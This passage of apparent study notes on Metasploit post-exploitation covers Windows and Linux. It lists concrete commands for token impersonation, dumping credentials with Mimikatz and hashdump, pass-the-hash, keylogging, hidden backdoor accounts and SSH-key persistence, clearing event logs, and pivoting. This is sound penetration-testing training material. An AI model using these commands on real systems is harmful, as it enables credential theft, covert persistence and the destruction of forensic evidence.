	+ `use exploit/windows/local/bypassuac_injection`
+ Will need to upgrade to x64
+ Can now use `getsystem` to elevate privs

### Windows Privilege Escalation:Token Impersonation With Incognito ###

#### Windows Access Tokens ####
+ Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (<mark class="hltr-yellow">LSASS</mark>)
+ A token is responsible for identifying and describing the security context of a process or thread running on a system.
	+ An access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time 
+ Access tokens are generated by the <mark class="hltr-orange">winlogon.exe</mark> process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the <mark class="hltr-orange">userinit.exe</mark> process. After which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token 

#### Windows Access Tokens Sorting ####
+ Windows access tokes are categorized based on the varying security levels assigned to them 
	+ These security levels are used to determine the privileges that are assigned to a specific token
+ An access token will typically be assigned one of the following security levels:
	+ <mark class="hltr-green">Impersonate-level</mark> tokens:
		+ Created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons
		+ Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilized the token 
	+ <mark class="hltr-green">Delegate-level</mark> tokens:
		+ Created through an interactive login on Windows, through traditional login or through remote access protocols such as RDP
		+ Delegate-level tokens <mark class="hltr-red">pose the largest threat</mark> as they can be used to impersonate tokens on any system 

#### Windows Privileges For Impersonation ####
+ The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available
+ The following are the privileges that are required for a successful impersonation attack:
	+ <mark class="hltr-red">SeAssignPrimaryToken</mark>: Allows a user to impersonate tokens 
	+ <mark class="hltr-red">SeCreateToken</mark>: Allows a user to create an arbitrary token with administrative privileges 
	+ <mark class="hltr-red">SeImpersonatePrivilege</mark>: Allows a user to create a process under the security context of another user, typically with administrative privileges 
+ Note: Privileges can be checked on meterpreter with `getprivs`

#### THe Incognito Module ####
+ Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation 
+ Can use the incognito module to display a list of available tokens that we can impersonate 
+ After checking that the **SeImpersonatePrivilege** is available with `getprivs`, in the meterpreter session can use `load incognito`. Can now use incognito to do the following:
	+ `list tokens -u` : will list tokens available
		+ if there is a **Delegation Token** available such as <mark class="hltr-blue">\Adminstrator</mark>, will want to impersonate their higher privileges 
	+ `impersonate_token "[TOKEN]"`: Allows the user to impersonate the token 
		+ Will now have elevated privileges 
		+ Will want to migrate to a process that has higher access with `ps` to find a process with higher privileges, and then `migrate [PID]` to move to the process 

### Dumping Hashes With Mimikatz ####

#### Mimikatz ####
+ Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy
	+ It allows for the extraction of plaintext credentials from memory, password hashes from local SAM databases and more 
+ The <mark class="hltr-green">SAM</mark> (Security Account Manager) database is a database file on Windows systems that stores user passwords and can be used to authenticate users both locally and remotely 
+ Can utilize the pre-build mimikatz executable, alternatively with a meterpreter session on a Windows target, can utilize the inbuilt meterpreter extension **Kiwi**
+ <mark class="hltr-red">Kiwi</mark> allows us to dynamically execute Mimikatz on the target system without touching the disk 

#### Kiwi In Use ####
+ In a meterpreter, will use `load kiwi` 
	+ can use `help` to see all that can be dumped
	+ `creds_all` will dump all 
+ Alternatively, can use `upload /usr/share/windows-resources/binaries/mimikatz/x64/mimikatz.exe` to upload the binary directly 
	+ Will then use `privilge::debug` to verify that the privileges are high enough 
	+ Then `sekurlsa::logonpasswords` to dump the passwords 

### Pass-the-Hash With PSExec ###

#### Pass-The-Hash ####
+ Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately
+ Can use the psExec module to legitimately authenticate with the target system via SMB
+ This technique will allow us to obtain access to the target system via legitimate credentials as apposed to obtaining accesses via service exploitation

#### Dumping the hashes ####
+ With initial footing on a system with elevate credentials, will first use `pgrep lsass` to find the pid of the <mark class="hltr-yellow">lsass</mark> process, the will `migrate` into that pid 
+ Can now use `hashdump` to get all the hashes

#### psexec ####
+ Will set this up with the payload 
+  `set SMBUser <username>`
+ `set SMBPass <hash>`

### Establishing Persistence on Windows ###

#### Persistence ####
+ Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off access
+ Gaining an initial foothold is not enough, must maintain persistence access to your targets
+ Can utilize various post exploitation persistence modules to ensure that we always have access to the target system 

#### Persistence Modules####
+ Can use `search platform:windows persistence` to see the many different persistence modules. They all work different 
	+ `exploit/windows/local/persistence_service` will create a service paired with the meterpreter handler
	+ Will want to set the session of the initial access that you have, can change service description and name to make it more <mark class="hltr-blue">hidden</mark>
+ Now that the persistence module is run, will only need the <mark class="hltr-red">multi handler</mark> to reconnect 
	+ `use milti/handler` 

### Enabling RDP ###

#### RDP ####
+ Remote Desktop Protocol is a proprietary GUI remote access protocol developed my Microsoft and is used to remotely connect and interact with Windows system 
+ Uses TCP port 3389
+ Disabled by default, however, can utilize an MSF exploit module to enable RDP on the Windows target and consequently utilize RDP to remotely access the target system
+ RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text

#### enabling RDP ####
+ After a session on the target is available, will use `windows/manage/enable_rdp` 
+ Will need a username and password 
	+ can change the password of a admin for example on the shell via
		+ `net user administrator <newPassword>`  

#### Free RDP ####
* Can RDP onto the system using the `xfreerdp` command
	* Example: `xfreerdp /u:administrator /p:1234HelloSir*! /v:10.3.16.93`
	* <mark class="hltr-green">/u:</mark> specifies user
	* <mark class="hltr-green">/p:</mark>specifies password
	* <mark class="hltr-green">/v:</mark> specifies target IP

### Windows Keylogging ###

#### Keylogging ####
+ The process of recording or capturing the keystrokes entered on target system
+ Not limited to post exploitation, there are plenty of programs and USB devices that can be used to capture and transmit the keystrokes entered on a system
+ Meterpreter on Windows system provides us with the ability to capture the keystrokes entered on a target system and download them back you our local system 

#### Keylogging Module ####
+ Should first migrate to the explorer.exe process on the meterpreter session
	+ Keylogging works best on that process 
	+ `pgrep explorer` and `migrate` 
+ Can use `help` to see how to use the <mark class="hltr-red">keyscan_</mark> commands
	+ `keyscan_start` will start capture, `keyscan_stop` will stop capture, and `keyscan_dump` will dump the buffer 
	+ Will want to dump before you stop
	+ May need to start and stop it depending on the application

### Clearing Windows Event Logs ###

#### Windows Event Logs ####
+ The Windows OS stores and catalogs all actions/events performed on the system and stores them in the <mark class="hltr-green">Windows Event log</mark>
+ Event logs are categorized based on the type of events they store 
	+ <mark class="hltr-yellow">Application</mark> logs: Stores application/program events like startups, crashes, etc
	+ <mark class="hltr-yellow">System</mark> logs: Stores system events like startups, reboots, etc.
	+ <mark class="hltr-yellow">Security</mark> logs: Stores security events like password changes, authentication failures, etc.
+ Can be accessed via the Event Viewer on Windows
+ Event logs are the first stop of any forensic investigator after a compromise has been detected
	+ Therefore very important to clear your tracks

#### Clearing with Meterpreter ####
+ Simple command: `clearev` in meterpreter will clear the event logs
+ Will also want to remove any files transferred with `rm`

### Pivoting ###

#### Pivoting ####
+ Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host's private internal network
+ After gaining access to one host, can use that host to attack others
+ Meterpreter provides the ability to add a network route to the internal network's subnet and consequently scan and exploit other systems on the network

![[Screen Shot 2022-10-19 at 3.14.23 PM.png]]

#### Victim 1 to Victim 2 ####
+ Once a meterpreter session is gained on Victim 1, can check the `ipconfig` to see what Interface the subnet is associated to Victim 2
+ Will now want to <mark class="hltr-red">add a route</mark> to that network with `run autoroute -s 1.1.1.0/24`
	+ Can now access that network with meterpreter  
	+ Meterpreter modules will now work on that subnet
		+ A good port scanner is `auxiliary/scanner/portscan/tcp`
+ Will want to <mark class="hltr-green">change the name</mark> of the session connected to Victim 1 with `sessions -n victim-1 -i 1`
+ To use non meterpreter modules, like <mark class="hltr-red">db_nmap</mark>, will need to set up <mark class="hltr-yellow">port forwarding</mark> on Victim1, for example `portfwd add -l 1234 -p 80 -r <Victim2_IP>`
+ Now when can use a scan on Victim1's port 1234, which will forward to Victim2's port 80
	+ Example: `db_nmap -sS -sV -p 1234 localhost`
+ Can now use a module on Victim2 to get a meterpreter session
	+ Will have to use a  bind payload: `windows/meterpreter/bind_tcp`
		+ Bind tcp opens up a port on the victim's device. Usually a machine is behind a firewall (or NAT) and firewalls don't allow ports other than a few specific ones (like 80, 443, 22, etc)
	+ Will want to change the name of the Victim2 session

## Linux Post Exploitation ##

### Linux Post Exploitation Modules ###

#### Modules ####
+ MSF provides various post exploitation modules for both Windows and Linux
+ Can utilize these post exploitation modules to enumerate information about the Linux system we currently have access to:
	+ Enumerate system configuration 
	+ Enumerate environment variables
	+ Enumerate network configuration
	+ VM check
	+ Enumerate user history 

#### Enumeration ####
+ Will first use `db_nmap` to do initial service version detection
+ Based on services, can get initial access 

Can now do the following <mark class="hltr-green">enumeration</mark>:
+ `sysinfo` to get information like the OS, Architecture 
+ `getuid` to get current user info, UID=0 means root
+ can now switch to the <mark class="hltr-blue">shell</mark> with `shell` and start a bash session with `/bin/bash -i` 
+ `whoami` will identify the user
+ `cat /etc/passwd` will show the user accounts  on the system 
+ `groups <username>` will show what the groups the user is in 
+ `cat /etc/*issue` will get the linux distribution release version
+ `uname -r` gets kernel version, `-a` will get addition information
+ `ifconfig` or `ip a s` will show network information 
+ `netstat -antp` can show services running 
+ `ps aux` will show processes 
+ `env` shows environment variables 

#### Post Exploitation Enumeration Modules ####
Can see all that is found with the `loot` command
+ <mark class="hltr-red">enum_configs</mark>:
	+ Gathers linux configurations
+ <mark class="hltr-red">post/multi/gather/env</mark>:
	+ Gets the environment variables
+ <mark class="hltr-red">enum_network</mark>:
	+ Gathers network information 
+ <mark class="hltr-red">enum_protections</mark>:
	+ Looks for enabled system hardening mechanisms 
+ <mark class="hltr-red">enum_system</mark>:
	+ Gets system information like installs, user lists, history, and cron jobs
+ <mark class="hltr-red">checkcontainer</mark>:
	+ Checks if the machine is a container such as Docker
+ <mark class="hltr-red">checkvm</mark>:
	+ Checks if it is a vm 
+ <mark class="hltr-red">enum_users_history</mark>:
	+ Gather the all the users bash history file, which is a log of commands

### Linux Privilege Escalation: Exploiting A Vulnerable Program ###

#### Linux Privilege Escalation ####
+ The privilege escalation techniques will depend on the version of the Linux kernel, as well as distribution release 
+ MSF offers very little in regards to Linux kernel exploits
	+ However, there may be an exploit module that can be utilized to exploit a vulnerable service or program in order to elevate privileges 

Once access is gained, will do the following 
+ Check processes with `ps -aux`
+ Will cat and processes that look like they have potential 
+ <mark class="hltr-red">chkrootkit</mark> is a service to prevent root kits, scans every 60 seconds 
+ can get more info about it with `chkrootkit --help` and `chkrootkit -V` 
	+ if version is before .50, will be able to use the <mark class="hltr-red">chkrootkit</mark> module 

### Dumping Hashes With Hashdump ###

#### Hashdump ####
+ hashdump is a post exploitation module to dump linux hashes 
+ Linux password hashes are stored in the <mark class="hltr-yellow"> /etc/shadow</mark> file, can only be accessed by the root user or a user with root privileges 
+ The hashdump module can be used to dump the user account hashes from the <mark class="hltr-yellow"> /etc/shadow</mark> file
	+ Can also be used to un-shadow the hashes for password cracking with <mark class="hltr-red">John the Ripper</mark>

Once on the system with root with a meterpreter, can use the module
+ `post/linux/gather/hashdump` 
	+ Will gather and dump hashes 
+ Can now look in `loot` to see passwords 
	+ An `*` means there was no password specified 
+ The number between `$` will show what hashing algorithm it uses, the higher the harder to crack
	+ 6 is <mark class="hltr-blue">Sha512</mark> for example

### Establishing Persistence On Linux ###

#### Persistence ####
+ Persistence consists of techniques that adversaries use to keep access to system across restarts, changed credentials, and other interruption that could cut off their access
+ Gaining an initial foothold is not enough, need to setup and maintain persistent access to your targets
+ technique depends on target configuration
+ Can utilize various post exploitation persistence modules to ensure that we always have access to the target system 

#### manual Persistence ####
+ In a shell sessions, can look at users in the system with `cat /etc/passwd` 
	+ Adding a user should blend in with what is seen there, such as making it look like a service account 
+ Will use `useradd -m <username> -s <shell_to_use>
+ Create password with `passwd <username>`
+ Then will add the new account into the same group as the root
	+ `usermod -aG root <username>`
+ Can now use SSH with this user to get backdoor access 
+ Can also change UID with `usermod -u <num> <username>` That way it will look less new

#### Persistence Modules ####
+ Can use `search platform:linux persistence` to see many options available
	+ Will use `info` to get more details about them 
+ <mark class="hltr-red">cron_persistence</mark> will make a malicious cron job to continuously connect
	+ Be wary that this can be detected by an admin 
+ <mark class="hltr-red">service_persistence</mark> will make a service that can be used to get access, depends on distributions 
+ <mark class="hltr-red">sshkey_persistence</mark> will give us a key to authenticate to any user via ssh at anytime 
	+ Does not leave much indicators of compromise 
	+ can now access with `loot` 
	+ will want to add the key to a file ssh_key with `vim ssh_key`
	+ Give that file correct permissions with `chmod 400`
	+ Can now use `ssh -i ssh_key root@<ip_address>`

## Armitage Metasploit GUIs ##

### Port Scanning & Enumeration With Armitage ###

#### Armitage ####
+ A free Java based GUI front-end to the MSF, used to simplify network discovery, exploitation and post exploitation 
+ Provides the following functionality 
	+ Visualize targets
	+ Automate port scanning 
	+ Automate exploitation 
	+ Automate post exploitation 
+ Armitage requires the MSF database and the Metasploit backend service to be enabled and running in order to function correctly
+ Armitage comes pre-packaged with Kali
+ Can start it with `sudo armitage` 

#### Port Scanning ####
+ Will only need to add the host, right click it, and click <mark class="hltr-green">scan</mark> 
	+ Can now view services 
+ Can perform <mark class="hltr-yellow">enumeration</mark> with Hosts->Nmap scan
	+ Will set the desired host
	+ Can now view services on the host, with lots of enumerated details
	+ Can also show the OS on the host now 
+ Can right click and host and have <mark class="hltr-orange">login</mark> options
+ Will run Attacks -> Find attacks, to <mark class="hltr-blue">enumerate vulnerability </mark>
	+ Can now right click a host and see if any are available 
+ Can <mark class="hltr-red">exploit</mark> a system just by clicking on the module, filling out options, and launching 

### Exploitation & Post Exploitation With Armitage ###

#### Hands On ####
+ Will select a initial host and view services (after doing scanning and enumeration)
	+ Can search through services 
+ Will now exploit a system, and will see that the borders of the host is now red, meaning it is exploited 
	+ Can now right click that host and access via Meterpreter, and select many of the options meterpreter has 